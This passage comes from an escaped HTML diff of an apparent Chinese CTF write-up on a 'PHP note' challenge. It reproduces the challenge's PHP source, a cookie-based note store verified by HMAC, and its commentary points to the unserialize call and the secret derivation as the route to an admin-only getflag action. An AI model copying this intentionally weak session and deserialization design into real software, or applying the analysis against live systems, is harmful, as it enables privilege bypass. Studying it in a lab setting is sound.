+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$realname&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$nickname&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$nickname&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">gen_secret&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$nickname&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;index&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$action&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;logout&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">session_destroy&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;index&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$action&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;post&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$method&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$title&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;title&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$body&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;body&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$note&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">addnote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$title&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$body&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">base64_encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">serialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$note&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">setcookie&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;note&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">setcookie&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;hmac&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nx">hmac&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;index&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$action&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;getflag&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$note&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">getflag&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;!doctype html&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;html&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;title&amp;gt;PHP note&amp;lt;/title&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;style&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> textarea {
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> resize: none;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> width: 300px;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> height: 200px;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> }
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;/style&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;?php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> if (!is_login()) {
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> $realname = htmlspecialchars($realname);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> $nickname = htmlspecialchars($nickname);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> ?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;form action=&amp;#34;/?action=login&amp;#34; method=&amp;#34;post&amp;#34; id=&amp;#34;login&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;firstname&amp;#34; placeholder=&amp;#34;First Name&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;lastname&amp;#34; placeholder=&amp;#34;Last Name&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;nickname&amp;#34; id=&amp;#34;nickname&amp;#34; placeholder=&amp;#34;nickname&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;realname&amp;#34; id=&amp;#34;realname&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Login&amp;lt;/button&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;/form&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;?php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> } else {
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> ?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;h1&amp;gt;Welcome, &amp;lt;?=$realname?&amp;gt;&amp;lt;?= !empty($nickname) ? &amp;#34; ($nickname)&amp;#34; : &amp;#34;&amp;#34; ?&amp;gt;&amp;lt;/h1&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;a href=&amp;#34;/?action=logout&amp;#34;&amp;gt;logout&amp;lt;/a&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;!-- &amp;lt;a href=&amp;#34;/?action=source&amp;#34;&amp;gt;source&amp;lt;/a&amp;gt; --&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;br/&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;br/&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;?php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> foreach($note-&amp;gt;getnotes() as $k =&amp;gt; $v) {
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> list($title, $body) = $v;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> $title = htmlspecialchars($title);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> $body = htmlspecialchars($body);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> ?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;h2&amp;gt;&amp;lt;?=$title?&amp;gt;&amp;lt;/h2&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;p&amp;gt;&amp;lt;?=$body?&amp;gt;&amp;lt;/p&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;?php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> }
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> ?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;form action=&amp;#34;/?action=post&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;title&amp;#34; placeholder=&amp;#34;title&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;br&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;textarea name=&amp;#34;body&amp;#34; placeholder=&amp;#34;body&amp;#34;&amp;gt;&amp;lt;/textarea&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Post&amp;lt;/button&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;/form&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;?php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> }
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> ?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;?php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> ?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;script&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> document.querySelector(&amp;#34;form#login&amp;#34;).addEventListener(&amp;#39;submit&amp;#39;, (e) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> const nickname = document.querySelector(&amp;#34;input#nickname&amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> const firstname = document.querySelector(&amp;#34;input#firstname&amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> const lastname = document.querySelector(&amp;#34;input#lastname&amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> document.querySelector(&amp;#34;input#realname&amp;#34;).value = `${firstname.value} ${lastname.value}`
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> if (nickname.value.length == 0 &amp;amp;&amp;amp; firstname.value.length &amp;gt; 0 &amp;amp;&amp;amp; lastname.value.length &amp;gt; 0) {
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> }
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> })
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;/script&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err"> &amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;/html&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>乍一看确实没有任何的漏洞点，让人比较在意的只有&lt;code>unserialize&lt;/code>函数，我们关注的是&lt;code>getflag()&lt;/code>，条件是成为管理员，而我们可以看到有以下条件：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">verify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$hmac&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$secret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$secret&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">hash_equals&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">hash_hmac&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sha256&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$secret&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nv">$hmac&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$note&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">verify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_COOKIE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;note&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$_COOKIE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;hmac&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">?&lt;/span> &lt;span class="nx">unserialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_COOKIE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;note&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">:&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Note&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>如果没有通过&lt;code>verify&lt;/code>函数判断，&lt;code>Note&lt;/code>的构造函数会设置&lt;code>$this-&amp;gt;isadmin = False;&lt;/code>，但是&lt;code>$_SESSION['secret']&lt;/code>又由&lt;code>gen_secret&lt;/code>函数生成，&lt;code>SALT&lt;/code>和&lt;code>PEPPER&lt;/code>我们都不知道，用一般的方法拿到 secret 基本不可能。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">gen_secret&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$seed&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">SALT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$seed&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">PEPPER&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$action&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$method&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$nickname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$realname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$realname&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$realname&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;invalid name&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$realname&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$nickname&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$nickname&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
